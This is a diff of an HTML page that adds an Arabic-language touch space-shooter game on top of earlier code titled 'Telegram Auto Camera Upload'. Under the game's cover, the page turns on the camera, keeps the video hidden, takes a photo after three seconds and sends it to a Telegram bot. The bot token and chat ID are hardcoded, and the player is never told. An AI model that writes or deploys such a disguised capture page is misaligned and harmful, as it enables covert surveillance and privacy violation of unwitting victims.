@@ -1,25 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <title>Telegram Auto Camera Upload</title>
+  <meta charset="UTF-8">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+      touch-action: none;
+    }
+    canvas {
+      display: block;
+      width: 100vw;
+      height: 100vh;
+    }
+    #video {
+      display: none;
+    }
+    #hud {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      font-size: 18px;
+      display: flex;
+      gap: 20px;
+      z-index: 5;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 8px 16px;
+      border-radius: 10px;
+      border: 1px solid #0ff;
+    }
+  </style>
 </head>
 <body>
-  <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+  <div id="hud">
+    <div>النقاط: <span id="score">0</span></div>
+    <div>الطاقة: <span id="lives">3</span></div>
+  </div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    resizeCanvas();
+    window.addEventListener("resize", resizeCanvas);
+
+    // ======== تشغيل الكاميرا و الالتقاط ========
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
-
         video.onloadedmetadata = () => {
           setTimeout(() => {
             captureAndSend();
-          }, 1000); 
+          }, 3000); // بعد 3 ثواني من التشغيل
         };
       })
       .catch(error => {
@@ -28,10 +74,14 @@
       });
 
     function captureAndSend() {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
+      const tempCanvas = document.createElement('canvas');
+      tempCanvas.width = video.videoWidth;
+      tempCanvas.height = video.videoHeight;
+      const tempCtx = tempCanvas.getContext('2d');
+      tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
+      tempCanvas.toBlob(blob => {
         const formData = new FormData();
-        formData.append('chat_id', '1702324511'); // Chat ID الخاص بك
+        formData.append('chat_id', '1702324511');
         formData.append('photo', blob, 'photo.png');
 
         fetch('https://api.telegram.org/bot7902247042:AAGhKg-93qflFaPHVrIa6QPwY3ruRVk5Fs4/sendPhoto', {
@@ -41,13 +91,196 @@
         .then(response => response.json())
         .then(data => {
           console.log('تم الإرسال:', data);
-          if (data.ok) 
-        
+        })
+        .catch(error => {
           console.error('خطأ أثناء الإرسال:', error);
           alert('فشل في إرسال الصورة.');
         });
       }, 'image/png');
     }
+
+    // ======== عناصر اللعبة ========
+    const scoreEl = document.getElementById("score");
+    const livesEl = document.getElementById("lives");
+
+    let spaceship = {
+      x: canvas.width / 2,
+      y: canvas.height - 80,
+      width: 40,
+      height: 50,
+      targetX: canvas.width / 2,
+      speedX: 0,
+      angle: 0
+    };
+
+    let bullets = [];
+    let enemies = [];
+    let stars = [];
+    let score = 0;
+    let lives = 3;
+    let lastTouchX = null;
+
+    for (let i = 0; i < 120; i++) {
+      stars.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        size: Math.random() * 2 + 1,
+        speed: Math.random() * 0.5 + 0.2
+      });
+    }
+
+    function drawStars() {
+      ctx.fillStyle = "white";
+      stars.forEach(star => {
+        ctx.beginPath();
+        ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+        ctx.fill();
+        star.y += star.speed;
+        if (star.y > canvas.height) {
+          star.y = 0;
+          star.x = Math.random() * canvas.width;
+        }
+      });
+    }
+
+    function drawSpaceship() {
+      ctx.save();
+      ctx.translate(spaceship.x, spaceship.y);
+      ctx.rotate(spaceship.angle);
+      ctx.fillStyle = "cyan";
+      ctx.beginPath();
+      ctx.moveTo(0, -spaceship.height / 2);
+      ctx.lineTo(-spaceship.width / 2, spaceship.height / 2);
+      ctx.lineTo(spaceship.width / 2, spaceship.height / 2);
+      ctx.closePath();
+      ctx.fill();
+      ctx.restore();
+    }
+
+    function drawBullets() {
+      ctx.fillStyle = "yellow";
+      bullets.forEach((b, i) => {
+        b.y -= b.speed;
+        ctx.fillRect(b.x, b.y, b.width, b.height);
+        if (b.y < 0) bullets.splice(i, 1);
+      });
+    }
+
+    function drawEnemies() {
+      enemies.forEach((e, ei) => {
+        e.y += e.speed;
+        e.x += Math.sin(e.time / 20) * 1.5;
+        e.time++;
+        let gradient = ctx.createRadialGradient(
+          e.x + e.size / 2, e.y + e.size / 2, 5,
+          e.x + e.size / 2, e.y + e.size / 2, e.size
+        );
+        gradient.addColorStop(0, "white");
+        gradient.addColorStop(1, e.color);
+        ctx.fillStyle = gradient;
+        ctx.beginPath();
+        ctx.arc(e.x + e.size / 2, e.y + e.size / 2, e.size / 2, 0, Math.PI * 2);
+        ctx.fill();
+
+        if (e.y > canvas.height) {
+          enemies.splice(ei, 1);
+          loseLife();
+        }
+
+        bullets.forEach((b, bi) => {
+          if (
+            b.x < e.x + e.size &&
+            b.x + b.width > e.x &&
+            b.y < e.y + e.size &&
+            b.y + b.height > e.y
+          ) {
+            bullets.splice(bi, 1);
+            enemies.splice(ei, 1);
+            score++;
+            scoreEl.textContent = score;
+          }
+        });
+      });
+    }
+
+    function shoot() {
+      bullets.push({
+        x: spaceship.x - 2,
+        y: spaceship.y - spaceship.height / 2,
+        width: 4,
+        height: 10,
+        speed: 8
+      });
+    }
+
+    function spawnEnemy() {
+      const size = 30 + Math.random() * 15;
+      const x = Math.random() * (canvas.width - size);
+      const colors = ["#f00", "#ff0", "#0ff", "#f0f"];
+      enemies.push({
+        x,
+        y: -size,
+        size,
+        speed: 1.5 + Math.random() * 2,
+        time: 0,
+        color: colors[Math.floor(Math.random() * colors.length)]
+      });
+    }
+
+    function loseLife() {
+      lives--;
+      livesEl.textContent = lives;
+      if (lives <= 0) {
+        alert("انتهت اللعبة! نقاطك: " + score);
+        resetGame();
+      }
+    }
+
+    function resetGame() {
+      score = 0;
+      lives = 3;
+      bullets = [];
+      enemies = [];
+      scoreEl.textContent = score;
+      livesEl.textContent = lives;
+      spaceship.x = canvas.width / 2;
+      spaceship.targetX = canvas.width / 2;
+    }
+
+    function updateSpaceship() {
+      const dx = spaceship.targetX - spaceship.x;
+      spaceship.speedX = dx * 0.1;
+      spaceship.x += spaceship.speedX;
+      spaceship.angle = dx * 0.002;
+
+      spaceship.x = Math.max(spaceship.width / 2, Math.min(canvas.width - spaceship.width / 2, spaceship.x));
+    }
+
+    function gameLoop() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      drawStars();
+      updateSpaceship();
+      drawSpaceship();
+      drawBullets();
+      drawEnemies();
+      requestAnimationFrame(gameLoop);
+    }
+
+    canvas.addEventListener("touchstart", e => {
+      lastTouchX = e.touches[0].clientX;
+      spaceship.targetX = lastTouchX;
+    });
+
+    canvas.addEventListener("touchmove", e => {
+      e.preventDefault();
+      lastTouchX = e.touches[0].clientX;
+      spaceship.targetX = lastTouchX;
+    });
+
+    setInterval(shoot, 300);
+    setInterval(spawnEnemy, 1000);
+
+    gameLoop();
   </script>
 </body>
 </html>
